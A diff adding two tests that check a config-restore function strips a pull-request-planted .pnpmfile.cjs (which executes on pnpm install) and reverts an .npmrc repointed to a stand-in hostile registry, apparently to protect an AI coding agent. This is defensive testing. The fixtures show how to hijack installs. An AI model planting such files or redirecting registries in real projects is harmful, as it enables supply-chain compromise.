@@ -425,6 +425,46 @@ describe("restoreConfigFromBase", () => {
     ).toEqual([".claude/settings.json", "CLAUDE.md"]);
   });
 
+  test("removes a PR-added .pnpmfile.cjs and preserves it for review", () => {
+    // A fork PR plants a .pnpmfile.cjs. pnpm executes its top-level code on
+    // `pnpm install` — even with --ignore-scripts — so a routine install run
+    // by the agent would execute it. It does not exist on base.
+    writeRepoFile(
+      ".pnpmfile.cjs",
+      "require('fs').writeFileSync('/tmp/pwned', 'x');\nmodule.exports = {};\n",
+    );
+    git(["add", ".pnpmfile.cjs"]);
+    git(["commit", "-m", "pr adds pnpmfile"]);
+
+    restoreConfigFromBase("main");
+
+    // Gone from the tree the agent operates on...
+    expect(existsRepoFile(".pnpmfile.cjs")).toBe(false);
+    // ...but still inspectable in the read-only review snapshot.
+    expect(readRepoFile(".claude-pr/.pnpmfile.cjs")).toContain("/tmp/pwned");
+  });
+
+  test("restores a PR-modified .npmrc to the base version", () => {
+    git(["checkout", "main"]);
+    writeRepoFile(".npmrc", "registry=https://registry.npmjs.org/\n");
+    git(["add", ".npmrc"]);
+    git(["commit", "-m", "base adds npmrc"]);
+    git(["push", "origin", "main"]);
+    git(["checkout", "pr"]);
+    writeRepoFile(".npmrc", "registry=https://evil.example.com/\n");
+    git(["add", ".npmrc"]);
+    git(["commit", "-m", "pr repoints registry"]);
+
+    restoreConfigFromBase("main");
+
+    expect(readRepoFile(".npmrc")).toBe(
+      "registry=https://registry.npmjs.org/\n",
+    );
+    expect(readRepoFile(".claude-pr/.npmrc")).toBe(
+      "registry=https://evil.example.com/\n",
+    );
+  });
+
   function git(args: string[]): string {
     return execFileSync("git", args, {
       cwd: repoDir,
